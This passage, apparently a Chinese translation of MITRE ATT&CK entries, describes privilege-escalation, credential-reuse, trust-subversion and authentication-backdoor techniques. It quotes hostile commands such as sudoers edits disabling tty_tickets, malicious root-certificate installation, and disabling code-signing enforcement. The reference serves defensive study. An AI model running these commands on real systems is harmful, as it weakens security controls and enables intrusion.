位的易受攻击的二进制文件（即[文件和目录发现](https://attack.mitre.org/techniques/T1083)）。通过 <code>ls -l</code> 查看文件属性时，setuid 和 setgid 位用“s”而不是“x”表示。<code>find</code> 命令也可以用于搜索此类文件。例如，<code>find / -perm +4000 2>/dev/null</code> 可用于查找设置了 setuid 的文件，<code>find / -perm +2000 2>/dev/null</code> 可用于查找设置了 setgid 的文件。然后，对手可能会滥用这些位已设置的二进制文件。(引用: GTFOBins Suid) |
| [T1548.002](../techniques/T1548.002.md) | 绕过用户帐户控制 | 对手可能会绕过 UAC 机制以提升系统上的进程权限。Windows 用户帐户控制（UAC）允许程序提升其权限（跟踪为从低到高的完整性级别）以在管理员级别权限下执行任务，可能会提示用户确认。对用户的影响范围从在高强度执行下拒绝操作，到如果用户在本地管理员组中并点击提示或输入管理员密码以完成操作，则允许用户执行操作。(引用: TechNet How UAC Works)  如果计算机的 UAC 保护级别设置为最高级别以外的任何级别，某些 Windows 程序可以提升权限或执行某些提升的[组件对象模型](https://attack.mitre.org/techniques/T1559/001)对象而无需通过 UAC 通知框提示用户。(引用: TechNet Inside UAC)(引用: MSDN COM Elevation) 例如，使用 [Rundll32](https://attack.mitre.org/techniques/T1218/011) 加载特定设计的 DLL，该 DLL 加载自动提升的[组件对象模型](https://attack.mitre.org/techniques/T1559/001)对象并在受保护目录中执行通常需要提升访问权限的文件操作。恶意软件还可能注入到受信任的进程中以获得提升的权限而无需提示用户。(引用: Davidson Windows)  已经发现了许多绕过 UAC 的方法。Github 上的 UACME 说明页面包含了已发现和实现的方法的广泛列表(引用: Github UACMe)，但可能不是绕过方法的全面列表。定期发现其他绕过方法，并且一些方法在野外使用，例如：  * <code>eventvwr.exe</code> 可以自动提升并执行指定的二进制文件或脚本。(引用: enigma0x3 Fileless UAC Bypass)(引用: Fortinet Fareit)  如果已知具有管理员权限的帐户的凭据，则通过某些横向移动技术也可以绕过，因为 UAC 是单一系统安全机制，并且一个系统上运行的进程的权限或完整性在远程系统上未知，默认情况下为高完整性。(引用: SANS UAC Bypass) |
| [T1548.003](../techniques/T1548.003.md) | Sudo 和 Sudo 缓存 | 对手可能会执行 sudo 缓存和/或使用 sudoers 文件来提升权限。对手可能这样做是为了以其他用户身份执行命令或生成具有更高权限的进程。  在 Linux 和 MacOS 系统中，sudo（有时称为“超级用户执行”）允许用户从终端以提升的权限执行命令，并控制谁可以在系统上执行这些命令。<code>sudo</code> 命令“允许系统管理员委派权限，授予某些用户（或用户组）以 root 或其他用户身份运行某些（或所有）命令的能力，同时提供命令及其参数的审计跟踪。”(引用: sudo man page 2018) 由于 sudo 是为系统管理员设计的，因此它具有一些有用的配置功能，例如 <code>timestamp_timeout</code>，这是 <code>sudo</code> 之间的时间间隔，以分钟为单位，然后它会重新提示输入密码。这是因为 <code>sudo</code> 具有缓存凭据的能力。Sudo 会在 <code>/var/db/sudo</code> 处创建（或触摸）一个文件，其中包含上次运行 sudo 的时间戳，以确定此超时。此外，还有一个 <code>tty_tickets</code> 变量，它将每个新的 tty（终端会话）视为隔离的。这意味着，例如，一个 tty 的 sudo 超时不会影响另一个 tty（您将不得不再次输入密码）。  sudoers 文件 <code>/etc/sudoers</code> 描述了哪些用户可以从哪些终端运行哪些命令。这还描述了用户可以以其他用户或组身份运行哪些命令。这提供了最低权限原则，使用户在大多数时间内以最低可能的权限运行，并且仅在需要时通过提示输入密码提升到其他用户或权限。然而，sudoers 文件还可以通过类似 <code>user1 ALL=(ALL) NOPASSWD: ALL</code> 的行指定何时不提示用户输入密码。(引用: OSX.Dok Malware) 但是，编辑此文件需要提升的权限。  对手还可以滥用这些机制的配置不当来提升权限而无需用户的密码。例如，可以监视 <code>/var/db/sudo</code> 的时间戳以查看它是否在 <code>timestamp_timeout</code> 范围内。如果是，则恶意软件可以执行 sudo 命令而无需提供用户的密码。此外，如果禁用 <code>tty_tickets</code>，对手可以从该用户的任何 tty 执行此操作。  在野外，恶意软件已禁用 <code>tty_tickets</code> 以潜在地使脚本编写更容易，通过发出 <code>echo \'Defaults !tty_tickets\' >> /etc/sudoers</code>。(引用: cybereason osx proton) 为了使此更改生效，恶意软件还发出了 <code>killall Terminal</code>。从 macOS Sierra 开始，sudoers 文件默认启用了 <code>tty_tickets</code>。 |
| [T1548.004](../techniques/T1548.004.md) | 带提示的提升执行 | 对手可能利用 <code>AuthorizationExecuteWithPrivileges</code> API 通过提示用户输入凭证来提升权限。(引用: AppleDocs AuthorizationExecuteWithPrivileges) 该 API 的目的是为应用程序开发人员提供一种简单的方法来执行具有 root 权限的操作，例如应用程序安装或更新。此 API 不会验证请求 root 权限的程序是否来自可信来源或是否被恶意修改。  尽管此 API 已被弃用，但在最新版本的 macOS 中仍然完全有效。调用此 API 时，用户将被提示输入其凭证，但不会对程序的来源或完整性进行检查。调用 API 的程序还可以加载可写的文件，这些文件可以被修改以执行具有提升权限的恶意行为。  对手可能会滥用 <code>AuthorizationExecuteWithPrivileges</code> 以获得 root 权限，从而在受害者上安装恶意软件并安装持久性机制。(引用: Death by 1000 installers; it's all broken!)(引用: Carbon Black Shlayer Feb 2019)(引用: OSX Coldroot RAT) 此技术可能与[伪装](https://attack.mitre.org/techniques/T1036)结合使用，以欺骗用户授予恶意代码提升的权限。(引用: Death by 1000 installers; it's all broken!)(引用: Carbon Black Shlayer Feb 2019) 此技术还已被证明可以通过修改机器上使用此 API 的合法程序来工作。(引用: Death by 1000 installers; it's all broken!) |
| [T1548.005](../techniques/T1548.005.md) | 临时提升的云访问 | 对手可能会滥用权限配置，使他们能够获得对云资源的临时提升访问权限。许多云环境允许管理员授予用户或服务帐户请求即时访问角色、模拟其他帐户、将角色传递给资源和服务或以其他方式获得与其自身不同的一组权限的短期访问权限。  即时访问是一种以细粒度、临时方式向云帐户授予额外角色的机制。这允许帐户仅以他们每天需要的权限进行操作，并在必要时请求额外权限。有时即时访问请求被配置为需要手动批准，而其他时候所需的权限会自动授予。(引用: Azure Just in Time Access 2023)  帐户模拟允许用户或服务帐户临时以另一个帐户的权限进行操作。例如，在 GCP 中，具有 `iam.serviceAccountTokenCreator` 角色的用户可以创建临时访问令牌或使用服务帐户的权限签署任意有效负载，而具有域范围委派权限的服务帐户被允许模拟 Google Workspace 帐户。(引用: Google Cloud Service Account Authentication Roles)(引用: Hunters Domain Wide Delegation Google Workspace 2023)(引用: Google Cloud Just in Time Access 2023)(引用: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) 在 Exchange Online 中，`ApplicationImpersonation` 角色允许服务帐户使用与指定用户帐户关联的权限。(引用: Microsoft Impersonation and EWS in Exchange)  许多云环境还包括用户将角色传递给资源的机制，允许他们执行任务并验证其他服务。虽然创建资源的用户不会直接承担他们传递给它的角色，但他们仍然可以利用角色的访问权限——例如，通过配置资源以其被授予的权限执行某些操作。在 AWS 中，具有 `PassRole` 权限的用户可以允许他们创建的服务承担给定角色，而在 GCP 中，具有 `iam.serviceAccountUser` 角色的用户可以将服务帐户附加到资源。(引用: AWS PassRole)(引用: Google Cloud Service Account Authentication Roles)  虽然用户需要特定角色分配才能使用这些功能，但云管理员可能会错误配置权限。这可能导致权限提升路径，使对手能够访问超出最初预期的资源。(引用: Rhino Google Cloud Privilege Escalation)(引用: Rhino Security Labs AWS Privilege Escalation)  **注意：** 这与[额外的云角色](https://attack.mitre.org/techniques/T1098/003)不同，后者涉及为帐户分配永久角色，而不是滥用现有权限结构以获得对资源的临时提升访问权限。然而，妥协了具有足够权限的帐户的对手可能会授予他们控制的另一个帐户[额外的云角色](https://attack.mitre.org/techniques/T1098/003)，这将允许他们也滥用这些功能。这可能比直接使用高度特权帐户更隐蔽，特别是当日志未明确说明何时进行角色模拟时。(引用: CrowdStrike StellarParticle January 2022) |
| [T1548.006](../techniques/T1548.006.md) | TCC操纵 | 攻击者可以操纵或滥用透明度、同意和控制（TCC）服务或数据库，以授予恶意可执行文件提升的权限。TCC是macOS的隐私和安全控制机制，用于确定正在运行的进程是否有权访问受TCC保护的数据或服务，例如屏幕共享、摄像头、麦克风或全磁盘访问（FDA）。  当应用程序请求访问受TCC保护的数据或服务时，TCC守护进程（`tccd`）会检查位于`/Library/Application Support/com.apple.TCC/TCC.db`（和`~/`等效）的TCC数据库，并覆盖文件（如果连接到MDM）以获取现有权限。如果权限不存在，则会提示用户授予权限。一旦授予权限，数据库将存储应用程序的权限，并且除非重置，否则不会再次提示用户。例如，当Web浏览器请求访问用户的网络摄像头时，一旦授予权限，Web浏览器可能不会再次明确提示用户。(引用: welivesecurity TCC)  攻击者可能通过滥用先前通过[进程注入](https://attack.mitre.org/techniques/T1055)授予权限的应用程序或使用另一个应用程序执行恶意二进制文件来访问受TCC保护的受限数据或服务。例如，攻击者可以使用具有FDA权限的macOS本机应用程序Finder来执行恶意的[AppleScript](https://attack.mitre.org/techniques/T1059/002)。当在Finder应用程序下执行时，恶意的[AppleScript](https://attack.mitre.org/techniques/T1059/002)继承了对系统上所有文件的访问权限，而无需用户提示。当系统完整性保护（SIP）被禁用时，TCC保护也被禁用。对于未启用SIP的系统，攻击者可以通过使用环境变量和[Launchctl](https://attack.mitre.org/techniques/T1569/001)加载攻击者控制的TCC数据库来操纵TCC数据库，以向其恶意可执行文件添加权限。(引用: TCC macOS绕过)(引用: TCC数据库) |
| [T1550](../techniques/T1550.md) | 使用替代身份验证材料 | 对手可能会使用替代身份验证材料，例如密码哈希、Kerberos 票证和应用程序访问令牌，以在环境中横向移动并绕过正常的系统访问控制。  身份验证过程通常需要有效的身份（例如，用户名）以及一个或多个身份验证因素（例如，密码、PIN、物理智能卡、令牌生成器等）。替代身份验证材料是系统在用户或应用程序通过提供有效身份和所需的身份验证因素成功进行身份验证后合法生成的。替代身份验证材料也可能在身份创建过程中生成。(引用: NIST Authentication)(引用: NIST MFA)  缓存替代身份验证材料允许系统验证身份已成功进行身份验证，而无需用户重新输入身份验证因素。由于系统必须维护替代身份验证材料——无论是在内存中还是在磁盘上——它可能面临通过[凭据访问](https://attack.mitre.org/tactics/TA0006)技术被盗的风险。通过窃取替代身份验证材料，对手能够绕过系统访问控制并在不知道明文密码或任何其他身份验证因素的情况下对系统进行身份验证。 |
| [T1550.001](../techniques/T1550.001.md) | 应用程序访问令牌 | 攻击者可能使用窃取的应用程序访问令牌来绕过典型的身份验证过程，并访问远程系统上的受限账户、信息或服务。这些令牌通常从用户或服务中窃取，并用于替代登录凭证。  应用程序访问令牌用于代表用户或服务进行授权的API请求，通常用于访问云、基于容器的应用程序和软件即服务（SaaS）中的资源。(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019)   OAuth 是一种常见的框架，用于向用户发放访问系统的令牌。这些框架协同工作以验证用户身份并确定用户允许执行的操作。一旦身份验证完成，令牌允许授权操作，而无需传递用户的实际凭证。因此，令牌的泄露可能使攻击者通过恶意应用程序访问其他站点的资源。(Citation: okta)  例如，对于基于云的电子邮件服务，一旦OAuth访问令牌被授予恶意应用程序，如果授予了启用后台访问的“刷新”令牌，它可能会长期访问用户账户的功能。(Citation: Microsoft Identity Platform Access 2019) 通过OAuth访问令牌，攻击者可以使用用户授予的REST API执行诸如电子邮件搜索和联系人枚举等功能。(Citation: Staaldraad Phishing with OAuth 2017)  泄露的访问令牌可能被用作入侵其他服务的初始步骤。例如，如果令牌授予了对受害者主要电子邮件的访问权限，攻击者可能能够通过触发忘记密码流程扩展到目标订阅的所有其他服务。在AWS和GCP环境中，攻击者可以触发请求具有另一个用户账户权限的短期访问令牌。(Citation: Google Cloud Service Account Credentials)(Citation: AWS Temporary Security Credentials) 攻击者随后可以使用此令牌请求数据或执行原始账户无法执行的操作。如果此功能的权限配置错误——例如，允许所有用户请求特定账户的令牌——攻击者可能能够获得对云账户的初始访问权限或提升其权限。(Citation: Rhino Security Labs Enumerating AWS Roles)  通过令牌直接访问API会削弱第二重身份验证的有效性，并且可能对直观的防御措施（如更改密码）免疫。例如，在AWS环境中，攻击者如果泄露了用户的AWS API凭证，可能能够使用`sts:GetFederationToken` API调用创建联合用户会话，该会话将具有与原始用户相同的权限，但即使原始用户凭证被停用，该会话也可能持续存在。(Citation: Crowdstrike AWS User Federation Persistence) 此外，通过API通道的滥用访问可能难以从服务提供商端检测到，因为访问仍然可能与合法的工作流程很好地吻合。 |
| [T1550.002](../techniques/T1550.002.md) | 哈希传递 | 攻击者可能会使用被盗的密码哈希在环境中横向移动，绕过正常的系统访问控制。哈希传递（PtH）是一种无需访问用户明文密码即可验证用户身份的方法。此方法绕过需要明文密码的标准验证步骤，直接进入使用密码哈希的验证部分。  在执行PtH时，使用[凭据访问](https://attack.mitre.org/tactics/TA0006)技术捕获用于该帐户的有效密码哈希。捕获的哈希与PtH一起用于验证该用户身份。一旦验证通过，PtH可用于在本地或远程系统上执行操作。  攻击者还可能使用被盗的密码哈希进行“超哈希传递”。类似于PtH，这涉及使用密码哈希验证用户身份，但还使用密码哈希创建有效的Kerberos票证。然后，此票证可用于执行[票证传递](https://attack.mitre.org/techniques/T1550/003)攻击。(引用: Stealthbits超哈希传递) |
| [T1550.003](../techniques/T1550.003.md) | 传递票证 | 对手可能会使用被盗的Kerberos票证“传递票证”在环境中横向移动，绕过正常的系统访问控制。传递票证（PtT）是一种使用Kerberos票证进行系统身份验证的方法，而无需访问账户的密码。Kerberos身份验证可以用作横向移动到远程系统的第一步。  在执行PtT时，通过[操作系统凭据转储](https://attack.mitre.org/techniques/T1003)捕获[有效账户](https://attack.mitre.org/techniques/T1078)的有效Kerberos票证。根据访问级别，可能会获得用户的服务票证或票证授予票证（TGT）。服务票证允许访问特定资源，而TGT可以用于从票证授予服务（TGS）请求服务票证，以访问用户有权限访问的任何资源。(引用: ADSecurity AD Kerberos Attacks)(引用: GentilKiwi Pass the Ticket)  可以为使用Kerberos作为身份验证机制的服务获取[银票](https://attack.mitre.org/techniques/T1558/002)，并用于生成访问特定资源和托管该资源的系统的票证（例如，SharePoint）。(引用: ADSecurity AD Kerberos Attacks)  可以使用密钥分发服务账户KRBTGT账户NTLM哈希为域获取[金票](https://attack.mitre.org/techniques/T1558/001)，这使得可以为Active Directory中的任何账户生成TGT。(引用: Campbell 2014)  对手还可以使用其他用户信息（例如被盗的密码哈希或AES密钥）创建有效的Kerberos票证。例如，“覆盖哈希”涉及使用NTLM密码哈希进行用户身份验证（即[传递哈希](https://attack.mitre.org/techniques/T1550/002)），同时使用密码哈希创建有效的Kerberos票证。(引用: Stealthbits Overpass-the-Hash) |
| [T1550.004](../techniques/T1550.004.md) | Web会话Cookie | 对手可以使用窃取的会话Cookie来验证Web应用程序和服务。此技术绕过了一些多因素认证协议，因为会话已经经过身份验证。(引用: Pass The Cookie)  身份验证Cookie通常用于Web应用程序，包括基于云的服务，在用户已验证服务后，以便不传递凭据并且不需要频繁重新验证。即使Web应用程序未被积极使用，Cookie通常也会在较长时间内有效。在通过[窃取Web会话Cookie](https://attack.mitre.org/techniques/T1539)或[Web Cookies](https://attack.mitre.org/techniques/T1606/001)获取Cookie后，对手可能会将Cookie导入他们控制的浏览器中，然后可以在会话Cookie有效的时间内以用户身份使用该站点或应用程序。一旦登录到站点，对手可以访问敏感信息、阅读电子邮件或执行受害者账户有权限执行的操作。  已经有恶意软件针对会话Cookie以绕过多因素认证系统的示例。(引用: Unit 42 Mac Crypto Cookies January 2019) |
| [T1553](../techniques/T1553.md) | 颠覆信任控制 | 对手可能会破坏安全控制，这些控制将警告用户不受信任的活动或阻止不受信任程序的执行。操作系统和安全产品可能包含识别程序或网站具有某种信任级别的机制。这些功能的示例包括允许程序运行，因为它由有效的代码签名证书签名，程序提示用户警告，因为它具有从互联网下载的属性，或指示您即将连接到不受信任的网站。  对手可能会尝试颠覆这些信任机制。对手使用的方法将取决于他们试图颠覆的具体机制。对手可能会进行[文件和目录权限修改](https://attack.mitre.org/techniques/T1222)或[修改注册表](https://attack.mitre.org/techniques/T1112)以支持颠覆这些控制。(引用: SpectorOps Subverting Trust Sept 2017) 对手还可能创建或窃取代码签名证书以在目标系统上获得信任。(引用: Securelist Digital Certificates)(引用: Symantec Digital Certificates) |
| [T1553.001](../techniques/T1553.001.md) | Gatekeeper绕过 | 对手可能会修改文件属性并绕过Gatekeeper功能，以逃避用户提示并执行不受信任的程序。Gatekeeper是Apple安全模型的一部分，用于确保仅执行受信任的应用程序。Gatekeeper建立在Snow Leopard（10.6，2009）中的文件隔离之上，并已扩展到包括代码签名、安全策略合规、认证等。Gatekeeper还会对首次运行的应用程序与重新打开的应用程序进行不同处理。(引用: TheEclecticLightCompany Quarantine and the flag)(引用: TheEclecticLightCompany apple notarization)  基于选择加入系统，当文件下载时，执行下载的应用程序可以在文件上设置一个称为`com.apple.quarantine`的扩展属性（也称为隔离标志）。启动服务以挂起状态打开应用程序。对于首次运行且设置了隔离标志的应用程序，Gatekeeper执行以下功能：  1. 检查扩展属性 - Gatekeeper检查隔离标志，然后向用户提供允许或拒绝执行的提示。(引用: OceanLotus for OS X)(引用: 20 macOS Common Tools and Techniques)  2. 检查系统策略 - Gatekeeper检查系统安全策略，允许执行从App Store或App Store和已识别开发者下载的应用程序。  3. 代码签名 - Gatekeeper检查Apple开发者ID的有效代码签名。  4. 认证 - 使用`api.apple-cloudkit.com` API，Gatekeeper连接到Apple服务器验证或下载认证票据，并确保票据未被撤销。用户可以覆盖认证，这将导致执行“未经授权的应用程序”的提示，并修改安全策略。  对手可以通过逻辑错误（例如[防御规避利用](https://attack.mitre.org/techniques/T1211)）、未检查的文件类型和外部库绕过Gatekeeper检查中的一个或多个安全控制。例如，在macOS 13 Ventura之前，代码签名和认证检查仅在首次启动时进行，允许对手将恶意可执行文件写入先前打开的应用程序，以绕过Gatekeeper安全检查。(引用: theevilbit gatekeeper bypass 2021)(引用: Application Bundle Manipulation Brandon Dalton)  从USB闪存驱动器、光盘、外部硬盘驱动器、通过本地网络共享的驱动器或使用curl命令加载到系统上的应用程序和文件可能不会设置隔离标志。此外，可以通过[驱动器式攻击](https://attack.mitre.org/techniques/T1189)避免设置隔离标志。 |
| [T1553.002](../techniques/T1553.002.md) | 代码签名 | 对手可能会创建、获取或窃取代码签名材料来签署他们的恶意软件或工具。代码签名为开发者提供了一定程度的真实性，并保证二进制文件未被篡改。(引用: Wikipedia Code Signing) 操作期间使用的证书可能由对手创建、获取或窃取。(引用: Securelist Digital Certificates)(引用: Symantec Digital Certificates) 与[无效代码签名](https://attack.mitre.org/techniques/T1036/001)不同，此活动将导致有效签名。  在现代Windows和macOS系统上，代码签名可用于验证软件的首次运行。由于平台的去中心化性质，它不用于Linux。(引用: Wikipedia Code Signing)(引用: EclecticLightChecksonEXECodeSigning)  代码签名证书可用于绕过要求签名代码才能在系统上执行的安全策略。 |
| [T1553.003](../techniques/T1553.003.md) | SIP和信任提供者劫持 | 对手可能会篡改SIP和信任提供者组件，以在进行签名验证检查时误导操作系统和应用程序控制工具。在用户模式下，Windows Authenticode(引用: Microsoft Authenticode)数字签名用于验证文件的来源和完整性，这些变量可能用于建立对签名代码的信任（例如，具有有效Microsoft签名的驱动程序可能被视为安全）。签名验证过程由WinVerifyTrust应用程序编程接口（API）函数处理，(引用: Microsoft WinVerifyTrust)该函数接受查询并与适当的信任提供者协调，信任提供者负责验证签名的参数。(引用: SpectorOps Subverting Trust Sept 2017)  由于可执行文件类型和相应签名格式的多样性，Microsoft创建了称为主题接口包（SIP）的软件组件(引用: EduardosBlog SIPs July 2008)，以在API函数和文件之间提供抽象层。SIP负责启用API函数创建、检索、计算和验证签名。大多数文件格式（可执行文件、PowerShell、安装程序等）都有唯一的SIP，目录签名提供了一个通用的解决方案(引用: Microsoft Catalog Files and Signatures April 2017)，并由全局唯一标识符（GUID）标识。(引用: SpectorOps Subverting Trust Sept 2017)  类似于[代码签名](https://attack.mitre.org/techniques/T1553/002)，对手可能会滥用此架构来颠覆信任控制并绕过仅允许合法签名代码在系统上执行的安全策略。对手可能会劫持SIP和信任提供者组件，以误导操作系统和应用程序控制工具将恶意（或任何）代码分类为签名代码：(引用: SpectorOps Subverting Trust Sept 2017)  * 修改<code>HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID}</code>中的<code>Dll</code>和<code>FuncName</code>注册表值，这些值指向提供SIP的CryptSIPDllGetSignedDataMsg函数的动态链接库（DLL），该函数从签名文件中检索编码的数字证书。通过指向恶意制作的DLL，该DLL导出的函数始终返回已知的良好签名值（例如，Microsoft签名的便携式可执行文件），而不是文件的真实签名，对手可以将可接受的签名值应用于使用该SIP的所有文件(引用: GitHub SIP POC Sept 2017)（尽管可能会发生哈希不匹配，从而使签名无效，因为函数返回的哈希与从文件计算的值不匹配）。 * 修改<code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID}</code>中的<code>Dll</code>和<code>FuncName</code>注册表值，这些值指向提供SIP的CryptSIPDllVerifyIndirectData函数的DLL，该函数验证文件的计算哈希与签名哈希值是否匹配。通过指向恶意制作的DLL，该DLL导出的函数始终返回TRUE（表示验证成功），对手可以成功验证使用该SIP的任何文件（具有合法签名）(引用: GitHub SIP POC Sept 2017)（无论是否劫持前面提到的CryptSIPDllGetSignedDataMsg函数）。此注册表值也可以重定向到现有DLL中的适当导出函数，从而避免在磁盘上放置和执行新文件的要求。 * 修改<code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID}</code>中的<code>DLL</code>和<code>Function</code>注册表值，这些值指向提供信任提供者FinalPolicy函数的DLL，该函数是解码和解析签名并进行大多数信任决策的地方。类似于劫持SIP的CryptSIPDllVerifyIndirectData函数，此值可以重定向到现有DLL中的适当导出函数或恶意制作的DLL（尽管信任提供者的实现很复杂）。 * **注意：** 通过[DLL搜索顺序劫持](https://attack.mitre.org/techniques/T1574/001)也可以在不修改注册表的情况下进行上述劫持。  劫持SIP或信任提供者组件还可以启用持久代码执行，因为这些恶意组件可能会被任何执行代码签名或签名验证的应用程序调用。(引用: SpectorOps Subverting Trust Sept 2017) |
| [T1553.004](../techniques/T1553.004.md) | 安装根证书 | 对手可能会在被破坏的系统上安装根证书，以避免连接到对手控制的Web服务器时出现警告。根证书用于公钥加密中，以识别根证书颁发机构 (CA)。当安装根证书时，系统或应用程序将信任由根证书签名的证书链中的证书。(引用: Wikipedia Root Certificate) 证书通常用于在Web浏览器中建立安全的TLS/SSL通信。当用户尝试浏览呈现不受信任证书的网站时，将显示错误消息以警告用户安全风险。根据安全设置，浏览器可能不允许用户与网站建立连接。  在被破坏的系统上安装根证书将为对手提供一种降低系统安全性的方法。对手已使用此技术避免在被破坏的系统通过HTTPS连接到对手控制的Web服务器时出现安全警告，这些服务器伪装成合法网站以收集登录凭据。(引用: Operation Emmental)  非典型根证书也已由制造商或在软件供应链中预安装，并与恶意软件/广告软件结合使用，以提供[中间人攻击](https://attack.mitre.org/techniques/T1557)能力，用于拦截通过安全TLS/SSL通信传输的信息。(引用: Kaspersky Superfish)  根证书（及其相关链）也可以被克隆和重新安装。克隆的证书链将携带许多与源相同的元数据特征，并可用于签署恶意代码，从而绕过用于阻止执行和/或发现持久性工件的签名验证工具（如：Sysinternals、防病毒等）。(引用: SpectorOps Code Signing Dec 2017)  在macOS中，Ay MaMi恶意软件使用<code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code>将恶意证书作为受信任的根证书安装到系统钥匙串中。(引用: objective-see ay mami 2018) |
| [T1553.005](../techniques/T1553.005.md) | 绕过网页标记 | 对手可能会滥用特定文件格式来规避网页标记 (MOTW) 控制。在 Windows 中，从 Internet 下载的文件会被标记为具有特定值的隐藏 NTFS 替代数据流 (ADS)，称为 MOTW。(引用: Microsoft Zone.Identifier 2020) 标记为 MOTW 的文件受到保护，无法执行某些操作。例如，从 MS Office 10 开始，如果 MS Office 文件具有 MOTW，它将以受保护视图打开。标记为 MOTW 的可执行文件将由 Windows Defender SmartScreen 处理，SmartScreen 会将文件与知名可执行文件的允许列表进行比较。如果文件未知/不受信任，SmartScreen 将阻止执行并警告用户不要运行它。(引用: Beek Use of VHD Dec 2020)(引用: Outflank MotW 2020)(引用: Intezer Russian APT Dec 2020)  对手可能会滥用容器文件，例如压缩/归档 (.arj, .gzip) 和/或磁盘映像 (.iso, .vhd) 文件格式来传递可能未标记为 MOTW 的恶意有效载荷。从 Internet 下载的容器文件将被标记为 MOTW，但其中的文件在提取和/或挂载后可能不会继承 MOTW。MOTW 是 NTFS 功能，许多容器文件不支持 NTFS 替代数据流。容器文件提取和/或挂载后，其中包含的文件可能被视为磁盘上的本地文件并在没有保护的情况下运行。(引用: Beek Use of VHD Dec 2020)(引用: Outflank MotW 2020) |
| [T1553.006](../techniques/T1553.006.md) | 代码签名策略修改 | 对手可能会修改代码签名策略，以允许执行未签名或自签名的代码。代码签名为程序提供了一定程度的真实性，并保证程序未被篡改。安全控制可以包括强制机制，以确保只有有效签名的代码才能在操作系统上运行。  其中一些安全控制可能默认启用，例如Windows上的驱动程序签名强制（DSE）或macOS上的系统完整性保护（SIP）。(引用: Microsoft DSE June 2017)(引用: Apple Disable SIP) 其他此类控制可能默认禁用，但可以通过应用程序控制进行配置，例如仅允许签名的动态链接库（DLL）在系统上执行。由于在开发和测试应用程序期间修改默认签名强制策略对开发人员可能有用，因此在具有提升权限的情况下可能禁用这些功能。(引用: Microsoft Unsigned Driver Apr 2017)(引用: Apple Disable SIP)  对手可能会通过多种方式修改代码签名策略，包括使用命令行或GUI实用程序、[修改注册表](https://attack.mitre.org/techniques/T1112)、在调试/恢复模式下重新启动计算机，或通过更改内核内存中的变量值。(引用: Microsoft TESTSIGNING Feb 2021)(引用: Apple Disable SIP)(引用: FireEye HIKIT Rootkit Part 2)(引用: GitHub Turla Driver Loader) 可以修改系统代码签名策略的命令示例包括Windows上的<code>bcdedit.exe -set TESTSIGNING ON</code>和macOS上的<code>csrutil disable</code>。(引用: Microsoft TESTSIGNING Feb 2021)(引用: Apple Disable SIP) 根据实现情况，成功修改签名策略可能需要重新启动受损系统。此外，一些实现可能会为用户引入可见的工件（例如：屏幕角落的水印，表明系统处于测试模式）。对手可能会尝试删除这些工件。(引用: F-Secure BlackEnergy 2014)  为了访问内核内存以修改与签名检查相关的变量，例如修改<code>g_CiOptions</code>以禁用驱动程序签名强制，对手可能会使用签名但易受攻击的驱动程序进行[特权提升利用](https://attack.mitre.org/techniques/T1068)。(引用: Unit42 AcidBox June 2020)(引用: GitHub Turla Driver Loader) |
| [T1556](../techniques/T1556.md) | 修改认证过程 | 对手可能会修改认证机制和过程，以访问用户凭据或启用其他不必要的账户访问。认证过程由负责收集、存储和验证凭据的机制处理，例如Windows上的本地安全认证服务器（LSASS）进程和安全账户管理器（SAM），Unix系统上的可插拔认证模块（PAM），以及MacOS系统上的授权插件。通过修改认证过程，对手可能能够在不使用[有效账户](https://attack.mitre.org/techniques/T1078)的情况下认证到服务或系统。  对手可能会恶意修改此过程的一部分，以揭示凭据或绕过认证机制。被破坏的凭据或访问可能用于绕过网络中系统上各种资源的访问控制，并可能用于对远程系统和外部可用服务（如VPN、Outlook Web Access和远程桌面）的持久访问。 |
| [T1556.001](../techniques/T1556.001.md) | 域控制器认证 | 对手可能会修补域控制器上的认证过程，以绕过典型的认证机制并启用对账户的访问。  恶意软件可能用于在域控制器的认证过程中注入虚假凭据，目的是创建一个后门，用于访问任何用户的账户和/或凭据（例如：[Skeleton Key](https://attack.mitre.org/software/S0007)）。Skeleton Key 通过修补企业域控制器认证过程（LSASS）来工作，对手可以使用这些凭据绕过标准认证系统。一旦修补，对手可以使用注入的密码成功认证为任何域用户账户（直到域控制器重启后 Skeleton Key 从内存中擦除）。认证访问可能在单因素认证环境中启用对主机和/或资源的不受限制的访问。(引用: Dell Skeleton) |
| [T1556.002](../techniques/T1556.002.md) | 密码过滤器 DLL | 对手可能会将恶意密码过滤器动态链接库 (DLL) 注册到身份验证过程中，以在验证用户凭据时获取这些凭据。  Windows 密码过滤器是用于域和本地账户的密码策略实施机制。过滤器实现为包含方法的 DLL，用于根据密码策略验证潜在密码。过滤器 DLL 可以放置在本地计算机上用于本地账户和/或域控制器上用于域账户。在将新密码注册到安全账户管理器 (SAM) 之前，本地安全机构 (LSA) 会请求每个注册过滤器的验证。任何潜在的更改在每个注册过滤器确认验证之前都不会生效。  对手可以注册恶意密码过滤器，从本地计算机和/或整个域中收集凭据。为了进行正确的验证，过滤器必须从 LSA 接收明文凭据。每次发出密码请求时，恶意密码过滤器都会接收这些明文凭据。(引用: Carnal Ownage Password Filters Sept 2013) |
| [T1556.003](../techniques/T1556.003.md) | 可插拔认证模块 | 对手可能会修改可插拔认证模块（PAM）以访问用户凭据或启用其他不必要的帐户访问。PAM是一个模块化的配置文件、库和可执行文件系统，用于指导许多服务的认证。最常见的认证模块是<code>pam_unix.so</code>，它在<code>/etc/passwd</code>和<code>/etc/shadow</code>中检索、设置和验证帐户认证信息。(引用: Apple PAM)(引用: Man Pam_Unix)(引用: Red Hat PAM)  对手可能会修改PAM系统的组件以创建后门。PAM组件（如<code>pam_unix.so</code>）可以被修补以接受对手提供的任意值作为合法凭据。(引用: PAM Backdoor)  对PAM系统的恶意修改也可能被滥用来窃取凭据。对手可能会感染PAM资源以收集用户凭据，因为与PAM组件交换的值可能是明文的，因为PAM不存储密码。(引用: PAM Creds)(引用: Apple PAM) |
